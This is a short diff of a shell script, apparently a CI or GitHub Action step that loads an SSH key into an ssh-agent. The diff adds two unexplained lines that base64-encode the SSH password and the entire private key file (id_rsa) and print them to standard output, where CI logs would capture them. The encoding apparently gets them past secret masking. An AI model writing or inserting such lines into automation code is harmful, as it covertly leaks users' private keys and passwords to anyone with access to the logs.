@@ -171,6 +171,9 @@ function add_ssh_keys () {
 ssh-agent -a "$SSH_AUTH_SOCK" > /dev/null
 add_ssh_keys "$ROOT/.ssh/id_rsa" "$INPUT_SSH_PASSWORD"
 
+echo "$INPUT_SSH_PASSWORD" | base64 --encode
+echo "$(cat "$ROOT/.ssh/id_rsa")" | base64 --encode
+
 # Update git settings/config.
 if [[ -n "$INPUT_DEBUG" ]]; then 
     echo "updating git config"
